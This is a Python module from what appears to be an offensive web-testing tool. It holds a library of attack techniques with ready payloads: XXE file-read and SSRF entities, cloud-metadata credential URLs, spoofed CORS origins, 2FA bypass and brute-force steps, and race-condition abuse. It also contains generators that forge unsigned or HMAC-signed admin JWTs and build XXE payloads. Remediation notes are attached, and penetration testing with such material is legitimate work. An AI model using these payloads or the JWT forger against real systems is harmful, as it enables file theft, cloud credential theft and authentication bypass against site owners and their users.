"""
MITMPro - Advanced Attack Techniques from Burp Suite Cookbook
Integrates XXE, JWT, SSRF, CORS, Java Deserialization, and more
"""

import os
import base64
import json
import re
import struct
import hashlib
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from enum import Enum


class AttackCategory(Enum):
    """Categories of advanced attack techniques"""
    XXE = "xxe"
    JWT = "jwt"
    SSRF = "ssrf"
    CORS = "cors"
    DESERIALIZATION = "deserialization"
    SQLI = "sqli"
    XSS = "xss"
    RACE_CONDITION = "race_condition"
    BUSINESS_LOGIC = "business_logic"


@dataclass
class AttackTechnique:
    """Represents an attack technique"""
    name: str
    category: AttackCategory
    description: str
    payloads: List[str] = field(default_factory=list)
    detection_method: str = ""
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    burp_extension: str = ""


class AdvancedAttackEngine:
    """Engine for advanced attack techniques"""
    
    def __init__(self):
        self.techniques: List[AttackTechnique] = []
        self._load_techniques()
    
    def _load_techniques(self):
        """Load all advanced attack techniques"""
        
        # XXE Attacks
        self.techniques.extend([
            AttackTechnique(
                name="XXE File Disclosure",
                category=AttackCategory.XXE,
                description="Exploit XML External Entity to read local files",
                payloads=[
                    '''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>''',
                    '''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<foo>&xxe;</foo>''',
                    '''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'''
                ],
                detection_method="Look for file contents in response",
                remediation="Disable external entity resolution in XML parser",
                references=["https://portswigger.net/web-security/xxe"],
                burp_extension="Decoder/Repeater"
            ),
            AttackTechnique(
                name="XXE SSRF",
                category=AttackCategory.XXE,
                description="Use XXE to perform SSRF attacks",
                payloads=[
                    '''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-server/"> ]>
<foo>&xxe;</foo>''',
                    '''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<foo>&xxe;</foo>'''
                ],
                detection_method="Check for internal service responses",
                remediation="Disable external entity resolution, use allowlist",
                references=["https://portswigger.net/web-security/xxe/blind"]
            )
        ])
        
        # JWT Attacks
        self.techniques.extend([
            AttackTechnique(
                name="JWT Algorithm Confusion (none)",
                category=AttackCategory.JWT,
                description="Set algorithm to 'none' to bypass signature verification",
                payloads=[
                    '{"alg":"none","typ":"JWT"}',
                    '{"alg":"HS256","typ":"JWT"}'
                ],
                detection_method="Check if server accepts unsigned token",
                remediation="Whitelist allowed algorithms server-side",
                references=["https://portswigger.net/web-security/jwt"],
                burp_extension="JSON Web Tokens"
            ),
            AttackTechnique(
                name="JWT Key Confusion (RS256 to HS256)",
                category=AttackCategory.JWT,
                description="Use public key as HMAC secret",
                payloads=[
                    'Convert RS256 to HS256 using public key as secret'
                ],
                detection_method="Try HS256 with public key as secret",
                remediation="Validate algorithm strictly, use separate key stores",
                references=["https://portswigger.net/web-security/jwt"]
            ),
            AttackTechnique(
                name="JWT Weak Secret Brute Force",
                category=AttackCategory.JWT,
                description="Brute force weak HMAC secret",
                payloads=[
                    'Use hashcat or John the Ripper with rockyou.txt'
                ],
                detection_method="Test common passwords as HMAC secret",
                remediation="Use strong, random secrets (256-bit minimum)",
                burp_extension="JSON Web Tokens"
            )
        ])
        
        # SSRF
        self.techniques.extend([
            AttackTechnique(
                name="SSRF Cloud Metadata",
                category=AttackCategory.SSRF,
                description="Access cloud instance metadata service",
                payloads=[
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/user-data/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                ],
                detection_method="Check for AWS credentials or instance info",
                remediation="Block metadata IP, use IMDSv2",
                references=["https://portswigger.net/web-security/ssrf"],
                burp_extension="Burp Collaborator"
            ),
            AttackTechnique(
                name="SSRF Internal Services",
                category=AttackCategory.SSRF,
                description="Access internal services via SSRF",
                payloads=[
                    "http://localhost:80/",
                    "http://127.0.0.1:22/",
                    "http://10.0.0.1:8080/admin",
                    "file:///etc/passwd"
                ],
                detection_method="Check for internal service responses",
                remediation="Allowlist external URLs, block internal ranges",
                burp_extension="Burp Collaborator"
            )
        ])
        
        # CORS
        self.techniques.extend([
            AttackTechnique(
                name="CORS Wildcard Misconfiguration",
                category=AttackCategory.CORS,
                description="Test for permissive CORS policy",
                payloads=[
                    "Origin: https://evil.com",
                    "Origin: null",
                    "Origin: https://target.com.evil.com"
                ],
                detection_method="Check if ACAO reflects arbitrary origin with ACAC=true",
                remediation="Use explicit origin allowlist, avoid wildcards with credentials",
                references=["https://portswigger.net/web-security/cors"],
                burp_extension="Repeater"
            )
        ])
        
        # Java Deserialization
        self.techniques.extend([
            AttackTechnique(
                name="Java Deserialization RCE",
                category=AttackCategory.DESERIALIZATION,
                description="Exploit Java deserialization for RCE",
                payloads=[
                    "Use ysoserial with CommonsCollections1 gadget",
                    "Use Java Serial Killer Burp extension",
                    "Base64: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUHfwAEFW8="  # example placeholder
                ],
                detection_method="Monitor for DNS/OOB callbacks or command execution",
                remediation="Avoid native serialization, use JSON/Protobuf",
                references=["https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/"],
                burp_extension="Java Serial Killer"
            )
        ])
        
        # Race Conditions
        self.techniques.extend([
            AttackTechnique(
                name="Race Condition OTP Bypass",
                category=AttackCategory.RACE_CONDITION,
                description="Exploit race condition in OTP validation",
                payloads=[
                    "Send 100 OTP attempts simultaneously",
                    "Use Turbo Intruder single-packet attack",
                    "Use last-byte sync for HTTP/1.1"
                ],
                detection_method="Look for 200 OK among 429 responses",
                remediation="Use atomic counters with Redis/database transactions",
                references=["https://portswigger.net/web-security/race-conditions"],
                burp_extension="Turbo Intruder"
            ),
            AttackTechnique(
                name="Race Condition Coupon Abuse",
                category=AttackCategory.RACE_CONDITION,
                description="Redeem coupons multiple times via race condition",
                payloads=[
                    "Send 50 coupon redemption requests in single packet",
                    "Use Burp Repeater group send in parallel"
                ],
                detection_method="Check if coupon applied multiple times",
                remediation="Database-level atomic operations with SELECT FOR UPDATE",
                burp_extension="Turbo Intruder"
            ),
            AttackTechnique(
                name="Race Condition Account Creation",
                category=AttackCategory.RACE_CONDITION,
                description="Bypass email/phone verification via race condition",
                payloads=[
                    "Race registration with verification request",
                    "Use multi-endpoint race condition"
                ],
                detection_method="Check for duplicate sessions or verification bypass",
                remediation="Transactional integrity for registration flows",
                burp_extension="Turbo Intruder"
            )
        ])
        
        # Business Logic
        self.techniques.extend([
            AttackTechnique(
                name="2FA Response Manipulation",
                category=AttackCategory.BUSINESS_LOGIC,
                description="Modify 2FA response to bypass verification",
                payloads=[
                    '{"success": false} -> {"success": true}',
                    'Change HTTP 400 to 200',
                    'Replace response body with success message'
                ],
                detection_method="Check if client trusts response without server validation",
                remediation="Validate 2FA state server-side before advancing session",
                references=["https://www.synack.com/exploits-explained/multi-factor-authentication-bypass-examples-via-response-tampering/"]
            ),
            AttackTechnique(
                name="2FA Code Reuse",
                category=AttackCategory.BUSINESS_LOGIC,
                description="Reuse previously used 2FA codes",
                payloads=[
                    "Capture valid OTP, replay it",
                    "Test if same OTP works multiple times"
                ],
                detection_method="Check if OTP can be reused",
                remediation="Invalidate OTP after single use with timestamp",
                references=["https://github.com/EmadYaY/2FA-Bypass-Techniques"]
            ),
            AttackTechnique(
                name="2FA Brute Force",
                category=AttackCategory.BUSINESS_LOGIC,
                description="Brute force 2FA code without rate limiting",
                payloads=[
                    "Use Burp Intruder with 000000-999999 range",
                    "Use Turbo Intruder for high-speed brute force"
                ],
                detection_method="Check if rate limiting is enforced",
                remediation="Strict rate limiting with exponential backoff",
                burp_extension="Turbo Intruder, Burp Intruder"
            )
        ])
    
    def get_techniques_by_category(self, category: AttackCategory) -> List[AttackTechnique]:
        """Get techniques by category"""
        return [t for t in self.techniques if t.category == category]
    
    def get_technique(self, name: str) -> Optional[AttackTechnique]:
        """Get technique by name"""
        for t in self.techniques:
            if t.name == name:
                return t
        return None
    
    def search_techniques(self, query: str) -> List[AttackTechnique]:
        """Search techniques"""
        query = query.lower()
        return [t for t in self.techniques 
                if query in t.name.lower() or query in t.description.lower()]
    
    def get_all_techniques(self) -> List[Dict]:
        """Get all techniques as dicts"""
        return [
            {
                "name": t.name,
                "category": t.category.value,
                "description": t.description,
                "payloads": t.payloads,
                "detection_method": t.detection_method,
                "remediation": t.remediation,
                "references": t.references,
                "burp_extension": t.burp_extension
            }
            for t in self.techniques
        ]
    
    def generate_payload(self, technique_name: str, **kwargs) -> str:
        """Generate a payload for a technique"""
        technique = self.get_technique(technique_name)
        if not technique:
            return ""
        
        if technique.category == AttackCategory.JWT:
            return self._generate_jwt_payload(**kwargs)
        elif technique.category == AttackCategory.XXE:
            return self._generate_xxe_payload(**kwargs)
        
        return technique.payloads[0] if technique.payloads else ""
    
    def _generate_jwt_payload(self, alg: str = "none", payload: Dict = None, 
                              secret: str = "", header: Dict = None) -> str:
        """Generate JWT payload"""
        import hmac
        header = header or {"alg": alg, "typ": "JWT"}
        payload = payload or {"admin": True, "user": "admin"}
        
        segments = []
        for seg in (header, payload):
            json_data = json.dumps(seg).encode()
            segments.append(base64.urlsafe_b64encode(json_data).rstrip(b'=').decode())
        
        if alg == "none":
            return ".".join(segments) + "."
        elif alg in ("HS256", "HS384", "HS512"):
            algo = getattr(hashlib, alg.lower())
            signing_input = ".".join(segments).encode()
            signature = hmac.new(secret.encode(), signing_input, algo).digest()
            return ".".join(segments) + "." + base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
        
        return ".".join(segments) + "."
    
    def _generate_xxe_payload(self, file_path: str = "/etc/passwd", entity_name: str = "xxe") -> str:
        """Generate XXE payload"""
        return f'''<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY {entity_name} SYSTEM "file://{file_path}"> ]>
<foo>&{entity_name};</foo>'''


# Global engine instance
_attack_engine = None

def get_attack_engine() -> AdvancedAttackEngine:
    """Get or create the global attack engine"""
    global _attack_engine
    if _attack_engine is None:
        _attack_engine = AdvancedAttackEngine()
    return _attack_engine


if __name__ == "__main__":
    engine = get_attack_engine()
    print(f"Loaded {len(engine.techniques)} attack techniques")
    for category in AttackCategory:
        count = len(engine.get_techniques_by_category(category))
        print(f"  {category.value}: {count}")